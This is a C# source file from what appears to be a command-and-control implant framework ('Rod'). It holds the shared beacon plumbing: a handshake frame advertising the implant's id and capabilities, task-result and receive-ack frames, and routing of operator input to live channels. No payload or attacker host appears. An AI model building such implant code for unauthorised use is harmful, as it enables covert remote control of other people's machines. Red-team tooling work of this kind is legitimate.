using System.Collections.Concurrent;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The frame shapes and the cycle vocabulary every check-in client shares.
// Always compiled (the Chunking pattern): the transport modules that call it
// trim independently per bake, so the shared plumbing lives outside their
// files.

/// <summary>
/// What one connect-handshake-task cycle produced, driving the reconnect
/// policy every client's run loop applies.
/// </summary>
internal enum BeaconCycleResult
{
    /// <summary>The cycle never reached a handshake (a transport drop); retry.</summary>
    Dropped,

    /// <summary>The handshake succeeded and the session ran; reset the failure counter.</summary>
    Handshaken,

    /// <summary>The server refused the handshake permanently; the caller terminates.</summary>
    Terminal,
}

/// <summary>
/// The frame constructors and input router shared by the check-in clients:
/// one definition of the wire shapes, whichever transport carries them.
/// </summary>
internal static class BeaconFrames
{
    /// <summary>
    /// The handshake every check-in opens with: this implant's id, the
    /// negotiated protocol version, and the advertised capability set -- the
    /// baked class verbs intersected with the compiled handlers
    /// (architecture.md Sec 5.3), so the teamserver only ever dispatches verbs
    /// this binary can run. Both arms are advertised: the replay-nonce arm
    /// (Sec 9) stamps every dispatched task with a monotonic nonce covered by
    /// the signature once echoed, and the receive-ack arm (Sec 10.3) acks every
    /// parsed task before it executes so a dying stream's dispatches
    /// redeliver. A server that does not echo either keeps today's shape.
    /// </summary>
    public static HandshakeRequest Handshake(string implantId, IEnumerable<string> advertised)
    {
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = implantId,
            ReplayNonces = true,
            TaskAcks = true,
        };
        handshake.Capabilities.Add(advertised);
        return handshake;
    }

    public static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => ResultFrame(task.TaskId, outcome, output);

    public static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = taskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    /// <summary>
    /// The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
    /// one parsed task, sent before anything executes.
    /// </summary>
    public static Frame AckFrame(string taskId)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
            Kind = FrameKind.TaskAck,
        };

    /// <summary>
    /// One ChannelInput frame: operator input for a live channel, routed by
    /// task id. Input for a task with no live channel is dropped and logged --
    /// a channel that already ended, or input that raced the transport.
    /// </summary>
    public static void RouteChannelInput(
        Frame frame,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TextWriter log)
    {
        ChannelInput input;
        try
        {
            input = ChannelInput.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return;
        }

        if (liveChannels.TryGetValue(input.TaskId, out var channel))
        {
            if (!channel.Receive(input.Data.ToArray(), input.Eof))
                log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
        }
        else
        {
            log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
        }
    }
}
